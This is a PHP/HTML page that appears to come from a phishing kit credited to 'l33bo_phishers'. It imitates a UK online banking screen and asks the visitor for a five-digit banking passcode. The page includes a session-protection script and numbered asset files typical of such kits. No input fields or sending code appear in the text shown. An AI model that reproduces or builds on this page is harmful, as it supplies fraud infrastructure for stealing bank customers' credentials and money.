<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
require "../includes/session_protect.php";
?>
﻿<!DOCTYPE html>
<html lang="en-GB">
<head>
<link rel="stylesheet" type="text/css" href="css/001.css" media="screen" />
<script type="text/javascript" src="js/001.js"></script>
<script type="text/javascript" src="js/002.js"></script>
<script type="text/javascript" src="js/003.js"></script>
</head>
<body class='personal ContextualHelp'>
<div class="header">
<div class="">
</div>
<div class="separator">
<hr />
</div>
</div>
<div class="page">
<div class="body">
<div class="content">
<div class="section">
<div id='box1' class='mod cont-sm borderless'>
<div class="rt">
<div class="lt">
<div class="m-cont">
<p>Enter your five-digit passcode which allows you to access the online banking service.</p></div>
</div>
</div>
<div class="rb"></div>
</div>
</div>
</div>
<div class="main-footer"></div>
</div>
</body>
</html>
